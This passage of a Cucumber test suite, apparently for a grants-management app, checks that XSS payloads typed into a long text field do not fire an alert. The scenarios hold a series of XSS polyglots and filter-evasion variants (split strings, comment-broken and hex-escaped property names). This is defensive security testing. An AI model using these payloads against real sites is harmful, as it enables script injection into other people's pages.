+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                                                        | Field                          |
+      | javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \"onmouseover=/*&lt;svg/*/onload=alert()//> | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307242 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                                                           | Field                          |
+      | javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'> | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307244 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                       | Field                          |
+      | ';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307246 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                   | Field                          |
+      | ';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307256 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                   | Field                          |
+      | ';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307261 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                 | Field                          |
+      | ';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307264 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                       | Field                          |
+      | ';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307265 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                       | Field                          |
+      | ';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307266 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                               | Field                          |
+      | ';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307269 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                          | Field                          |
+      | ';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307272 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                      | Field                          |
+      | ';self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain']);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307274 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                      | Field                          |
+      | ';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307276 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                    | Field                          |
+      | ';top[/*foo*/'alert'/*bar*/](top[/*foo*/'document'/*bar*/]['domain']);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307278 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                          | Field                          |
+      | ';parent[/*foo*/'alert'/*bar*/](parent[/*foo*/'document'/*bar*/]['domain']);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307279 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                          | Field                          |
+      | ';frames[/*foo*/'alert'/*bar*/](frames[/*foo*/'document'/*bar*/]['domain']);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307280 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                  | Field                          |
+      | ';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307281 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                       | Field                          |
+      | ';window['\x61\x6c\x65\x72\x74'](window['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307282 @dilip
